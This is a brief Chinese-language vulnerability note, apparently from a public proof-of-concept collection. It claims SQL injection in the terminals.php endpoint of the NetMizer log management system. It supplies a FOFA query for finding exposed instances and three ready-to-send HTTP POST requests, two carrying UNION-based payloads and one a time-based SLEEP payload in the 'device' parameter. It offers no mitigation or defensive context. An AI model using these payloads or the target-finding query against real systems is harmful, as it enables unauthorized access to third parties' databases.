# NetMizer日志管理系统terminals接口存在SQL注入

# fofa
```
title="NetMizer 日志管理系统"
```

# poc
```javascript
POST /data/echart/terminals.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Priority: u=0
Content-Length: 40

action=phonelist-pie&type=3&device=1 UNION ALL SELECT NULL,CONCAT(0x71716a7a71,0x4b486d79695241494a69717451667a6d67487761764e72775a7066514176484f5a47697455596141,0x71766a7171),NULL-- -
```

```javascript
POST /data/echart/terminals.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Priority: u=0
Content-Length: 40

action=phonelist-grid&type=3&device=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x546d5a417a6972554767676547636c6f794e4e6d464c4e484e49626b6d4c6b4244615a4f67646758,0x717a7a7171),NULL,NULL-- -
```

```javascript
POST /data/echart/terminals.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Priority: u=0
Content-Length: 40

action=phonelist-bar&type=3&device=1 AND (SELECT 6478 FROM (SELECT(SLEEP(5)))hviO)
```
